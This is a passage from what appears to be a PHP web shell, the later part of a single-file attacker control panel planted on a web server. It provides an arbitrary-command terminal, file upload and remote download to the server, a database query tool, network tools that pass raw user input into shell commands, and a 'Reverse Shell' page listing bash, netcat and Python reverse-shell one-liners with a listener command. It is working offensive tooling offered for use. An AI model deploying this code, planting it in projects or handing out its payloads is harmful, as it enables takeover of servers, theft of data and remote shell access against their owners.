                    <a href="?action=files&path=<?php echo urlencode($current_path); ?>" class="btn">⬅️ Back</a>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- ===== TERMINAL REAL TIME ===== -->
    <?php if ($action == 'terminal'): ?>
    <div class="card">
        <div class="card-header">💻 Real Time Terminal</div>
        <div class="card-body">
            <div class="terminal">
                <div class="terminal-output" id="terminalOutput">
                    <div class="terminal-line">[!] Type your command below</div>
                    <div class="terminal-line">[!] Supports: ls, cd, pwd, cat, echo, curl, wget, python, php, etc</div>
                </div>
                <div class="terminal-input">
                    <span class="terminal-prompt">$></span>
                    <input type="text" id="terminalCommand" placeholder="Enter command..." autofocus>
                    <button id="runCommand" class="primary">Run</button>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        const terminalOutput = document.getElementById('terminalOutput');
        const terminalCommand = document.getElementById('terminalCommand');
        const runButton = document.getElementById('runCommand');
        let currentPath = '<?php echo addslashes($current_path); ?>';
        
        function addTerminalLine(text, isError = false) {
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.style.color = isError ? '#ef4444' : '#10b981';
            line.innerHTML = text;
            terminalOutput.appendChild(line);
            terminalOutput.scrollTop = terminalOutput.scrollHeight;
        }
        
        function executeTerminalCommand() {
            const cmd = terminalCommand.value.trim();
            if (cmd === '') return;
            
            addTerminalLine('$> ' + cmd);
            terminalCommand.value = '';
            
            fetch(window.location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=exec_cmd&command=' + encodeURIComponent(cmd) + '&ajax=1'
            })
            .then(response => response.text())
            .then(data => {
                const lines = data.split('\n');
                lines.forEach(line => {
                    if (line.trim()) addTerminalLine(line);
                });
                addTerminalLine('─' . repeat(50));
            })
            .catch(error => {
                addTerminalLine('[!] Error: ' + error, true);
            });
        }
        
        runButton.addEventListener('click', executeTerminalCommand);
        terminalCommand.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') executeTerminalCommand();
        });
    </script>
    <?php endif; ?>
    
    <!-- ===== AJAX HANDLER FOR TERMINAL ===== -->
    <?php if (isset($_POST['ajax']) && $_POST['ajax'] == '1' && isset($_POST['command'])): ?>
    <?php
        $ajax_cmd = $_POST['command'];
        $ajax_output = execute_command($ajax_cmd);
        echo implode("\n", $ajax_output);
        exit;
    ?>
    <?php endif; ?>
    
    <!-- ===== UPLOAD ===== -->
    <?php if ($action == 'upload_page'): ?>
    <div class="card">
        <div class="card-header">📤 File Uploader</div>
        <div class="card-body">
            <form method="POST" enctype="multipart/form-data" action="?action=upload&path=<?php echo urlencode($current_path); ?>">
                <input type="file" name="upload_file" required>
                <button type="submit" class="primary" style="margin-top:10px;">⬆️ Upload</button>
            </form>
            <p style="margin-top:15px; font-size:11px; color:#6b7280;">Max upload: <?php echo $CONFIG['max_upload'] / 1024 / 1024; ?> MB</p>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- ===== DATABASE ===== -->
    <?php if ($action == 'database'): ?>
    <div class="card">
        <div class="card-header">🗄️ Database Manager</div>
        <div class="card-body">
            <form method="POST" action="?action=db_query">
                <div class="grid-2">
                    <input type="text" name="db_host" placeholder="Host (localhost)" value="localhost">
                    <input type="text" name="db_user" placeholder="Username">
                    <input type="password" name="db_pass" placeholder="Password">
                    <input type="text" name="db_name" placeholder="Database name">
                </div>
                <textarea name="db_query" placeholder="SELECT * FROM users" rows="5" style="width:100%; margin-top:10px; font-family:monospace;"></textarea>
                <button type="submit" class="primary" style="margin-top:10px;">▶️ Execute Query</button>
            </form>
            <?php if ($sql_result !== null): ?>
            <pre style="margin-top:15px;"><?php echo htmlspecialchars(json_encode($sql_result, JSON_PRETTY_PRINT)); ?></pre>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- ===== NETWORK ===== -->
    <?php if ($action == 'network'): ?>
    <div class="card">
        <div class="card-header">🌐 Network Tools</div>
        <div class="card-body">
            <form method="POST">
                <div class="form-inline">
                    <input type="text" name="net_target" placeholder="IP or Domain" style="flex:1;" required>
                    <select name="net_type">
                        <option value="ping">Ping</option>
                        <option value="traceroute">Traceroute</option>
                        <option value="nslookup">NSLookup</option>
                        <option value="whois">Whois</option>
                    </select>
                    <button type="submit" name="net_submit">▶️ Run</button>
                </div>
            </form>
            <?php if (isset($_POST['net_submit'])): 
                $net_cmd = '';
                if ($_POST['net_type'] == 'ping') $net_cmd = 'ping -c 4 ' . $_POST['net_target'];
                elseif ($_POST['net_type'] == 'traceroute') $net_cmd = 'traceroute ' . $_POST['net_target'];
                elseif ($_POST['net_type'] == 'nslookup') $net_cmd = 'nslookup ' . $_POST['net_target'];
                else $net_cmd = 'whois ' . $_POST['net_target'];
                $net_out = execute_command($net_cmd);
            ?>
            <pre style="margin-top:15px;"><?php echo htmlspecialchars(implode("\n", $net_out)); ?></pre>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- ===== CURL PAGE ===== -->
    <?php if ($action == 'curl_page'): ?>
    <div class="card">
        <div class="card-header">⬇️ cURL HTTP Client</div>
        <div class="card-body">
            <form method="POST" action="?action=curl_request">
                <div class="form-group">
                    <label>URL:</label>
                    <input type="url" name="curl_url" placeholder="https://api.example.com/data" style="width:100%;" required>
                </div>
                <div class="form-group">
                    <label>Method:</label>
                    <select name="curl_method">
                        <option value="GET">GET</option>
                        <option value="POST">POST</option>
                        <option value="PUT">PUT</option>
                        <option value="DELETE">DELETE</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Data (for POST/PUT):</label>
                    <textarea name="curl_data" rows="4" style="width:100%; font-family:monospace;" placeholder='{"key":"value"} or key=value'></textarea>
                </div>
                <div class="form-group">
                    <label>Headers (one per line):</label>
                    <textarea name="curl_headers" rows="3" style="width:100%; font-family:monospace;" placeholder="Content-Type: application/json&#10;Authorization: Bearer token"></textarea>
                </div>
                <button type="submit" class="primary">🚀 Send Request</button>
            </form>
            
            <?php if ($curl_result !== null): ?>
            <div style="margin-top:20px;">
                <div class="card-header" style="margin-bottom:10px;">Response</div>
                <div><strong>HTTP Code:</strong> <?php echo $curl_result['http_code']; ?></div>
                <?php if ($curl_result['error']): ?>
                <div class="message error" style="margin-top:10px;">Error: <?php echo htmlspecialchars($curl_result['error']); ?></div>
                <?php endif; ?>
                <pre style="margin-top:10px;"><?php echo htmlspecialchars($curl_result['response']); ?></pre>
            </div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- ===== REVERSE SHELL ===== -->
    <?php if ($action == 'revshell'): ?>
    <div class="card">
        <div class="card-header">🔄 Reverse Shell</div>
        <div class="card-body">
            <form method="POST" action="?action=send_revshell">
                <div class="form-inline">
                    <input type="text" name="rev_ip" placeholder="Your IP" required>
                    <input type="text" name="rev_port" placeholder="Your Port" required>
                    <button type="submit" class="danger">🚀 Send Reverse Shell</button>
                </div>
            </form>
            <div style="margin-top:20px;">
                <div class="card-header" style="margin-bottom:10px;">Payload Examples</div>
                <pre>bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
nc -e /bin/sh YOUR_IP YOUR_PORT
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</pre>
                <p style="margin-top:10px; font-size:11px;">Listener: nc -lvnp PORT</p>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- ===== SEARCH ===== -->
    <?php if ($action == 'search_page'): ?>
    <div class="card">
        <div class="card-header">🔍 Search Files</div>
        <div class="card-body">
            <form method="POST" action="?action=do_search&path=<?php echo urlencode($current_path); ?>">
                <div class="form-inline">
                    <input type="text" name="search_term" placeholder="filename pattern" style="flex:1;" required>
                    <button type="submit">🔎 Search</button>
                </div>
            </form>
            <?php if (!empty($search_results)): ?>
            <div class="table-wrapper" style="margin-top:20px;">
                <table>
                    <thead><tr><th>File</th><th>Size</th><th>Modified</th></tr></thead>
                    <tbody>
                        <?php foreach ($search_results as $r): ?>
                        <tr><td><?php echo htmlspecialchars($r['path']); ?></td><td><?php echo $r['size']; ?></td><td><?php echo $r['mtime']; ?></td></tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- ===== TOOLS ===== -->
    <?php if ($action == 'tools'): ?>
    <div class="grid-3">
        <div class="card">
            <div class="card-header">🔐 Hash Generator</div>
            <div class="card-body">
                <form method="POST">
                    <input type="text" name="hash_text" placeholder="Text to hash" style="width:100%;">
                    <select name="hash_type" style="width:100%; margin:10px 0;">
                        <option>md5</option><option>sha1</option><option>sha256</option><option>sha512</option>
                    </select>
                    <button type="submit" name="hash_gen">Generate</button>
                </form>
                <?php if (isset($_POST['hash_gen'])): ?>
                <pre style="margin-top:10px;"><?php echo hash($_POST['hash_type'], $_POST['hash_text']); ?></pre>
                <?php endif; ?>
            </div>
        </div>
        <div class="card">
            <div class="card-header">📦 Base64</div>
            <div class="card-body">
                <form method="POST">
                    <textarea name="b64_text" rows="4" style="width:100%;" placeholder="Text or base64"></textarea>
                    <div style="display:flex; gap:10px; margin-top:10px;">
                        <button type="submit" name="b64_encode">Encode</button>
                        <button type="submit" name="b64_decode">Decode</button>
                    </div>
                </form>
                <?php if (isset($_POST['b64_encode'])): ?>
                <pre style="margin-top:10px;"><?php echo base64_encode($_POST['b64_text']); ?></pre>
                <?php endif; ?>
                <?php if (isset($_POST['b64_decode'])): ?>
                <pre style="margin-top:10px;"><?php echo base64_decode($_POST['b64_text']); ?></pre>
                <?php endif; ?>
            </div>
        </div>
        <div class="card">
            <div class="card-header">🌐 Download URL</div>
            <div class="card-body">
                <form method="POST">
                    <input type="url" name="dl_url" placeholder="https://example.com/file.zip" style="width:100%;">
                    <button type="submit" name="dl_submit" style="margin-top:10px;">Download to Server</button>
                </form>
                <?php if (isset($_POST['dl_submit'])): ?>
                <?php $content = @file_get_contents($_POST['dl_url']); if ($content): $filename = basename(parse_url($_POST['dl_url'], PHP_URL_PATH)); file_put_contents($current_path . $filename, $content); ?>
                <pre style="margin-top:10px;">[+] Downloaded: <?php echo htmlspecialchars($filename); ?></pre>
                <?php else: ?>
                <pre style="margin-top:10px;">[-] Download failed!</pre>
                <?php endif; ?>
                <?php endif; ?>
            </div>
        </div>
        <div class="card">
            <div class="card-header">🎨 String Tools</div>
            <div class="card-body">
                <form method="POST">
                    <textarea name="str_text" rows="4" style="width:100%;" placeholder="Text"></textarea>
                    <div style="display:flex; gap:10px; margin-top:10px; flex-wrap:wrap;">
                        <button type="submit" name="str_upper">UPPER</button>
                        <button type="submit" name="str_lower">lower</button>
                        <button type="submit" name="str_rev">Reverse</button>
                    </div>
                </form>
                <?php if (isset($_POST['str_upper'])): ?>
                <pre style="margin-top:10px;"><?php echo strtoupper($_POST['str_text']); ?></pre>
                <?php endif; ?>
                <?php if (isset($_POST['str_lower'])): ?>
                <pre style="margin-top:10px;"><?php echo strtolower($_POST['str_text']); ?></pre>
                <?php endif; ?>
                <?php if (isset($_POST['str_rev'])): ?>
                <pre style="margin-top:10px;"><?php echo strrev($_POST['str_text']); ?></pre>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- ===== SYSTEM INFO ===== -->
    <?php if ($action == 'info'): ?>
    <div class="card">
        <div class="card-header">ℹ️ System Information</div>
        <div class="card-body">
            <pre><?php echo htmlspecialchars($sys_info['os']); ?></pre>
            <pre>PHP Version: <?php echo $sys_info['php']; ?></pre>
            <pre>Current User: <?php echo $sys_info['user']; ?></pre>
            <pre>Disabled Functions: <?php echo $sys_info['disabled'] ?: 'none'; ?></pre>
            <pre>Open Basedir: <?php echo $sys_info['basedir']; ?></pre>
            <pre>Upload Max Size: <?php echo $sys_info['upload_max']; ?></pre>
            <pre>Memory Limit: <?php echo $sys_info['memory_limit']; ?></pre>
            <pre>Allow URL Fopen: <?php echo ini_get('allow_url_fopen'); ?></pre>
            <pre>Allow URL Include: <?php echo ini_get('allow_url_include'); ?></pre>
            <pre>Max Execution Time: <?php echo ini_get('max_execution_time'); ?> seconds</pre>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- ===== LOGOUT ===== -->
    <?php if ($action == 'logout'): session_destroy(); header('Location: ' . $_SERVER['PHP_SELF']); exit; endif; ?>
    
</div>

<script>
    const menuToggle = document.getElementById('menuToggle');
    const sidebar = document.getElementById('sidebar');
    
    if (menuToggle && sidebar) {
        menuToggle.addEventListener('click', function() {
            sidebar.classList.toggle('open');
        });
        
        document.addEventListener('click', function(event) {
            if (window.innerWidth <= 768) {
                if (!sidebar.contains(event.target) && !menuToggle.contains(event.target)) {
                    sidebar.classList.remove('open');
                }
            }
        });
    }
    
    function renameFile(oldname) {
        let newname = prompt('New name:', oldname);
        if (newname && newname !== oldname) {
            let form = document.createElement('form');
            form.method = 'POST';
            form.action = '?action=rename&path=<?php echo urlencode($current_path); ?>';
            form.innerHTML = '<input type="hidden" name="old_name" value="' + oldname + '"><input type="hidden" name="new_name" value="' + newname + '">';
            document.body.appendChild(form);
            form.submit();
        }
    }
    
    function chmodFile(filename) {
        let perms = prompt('Permissions (755, 644, 777):', '755');
        if (perms && /^[0-7]{3,4}$/.test(perms)) {
            let form = document.createElement('form');
            form.method = 'POST';
            form.action = '?action=chmod&path=<?php echo urlencode($current_path); ?>';
            form.innerHTML = '<input type="hidden" name="chmod_target" value="' + filename + '"><input type="hidden" name="perms" value="' + perms + '">';
            document.body.appendChild(form);
            form.submit();
        } else if (perms) {
            alert('Invalid permission format! Use 755, 644, 777, etc.');
        }
    }
    
    const showModalBtn = document.getElementById('showFileModalBtn');
    if (showModalBtn) {
        showModalBtn.addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('fileModal').style.display = 'flex';
        });
    }
    
    function closeModal() {
        document.getElementById('fileModal').style.display = 'none';
    }
</script>
</body>
</html>
<?php ob_end_flush(); ?>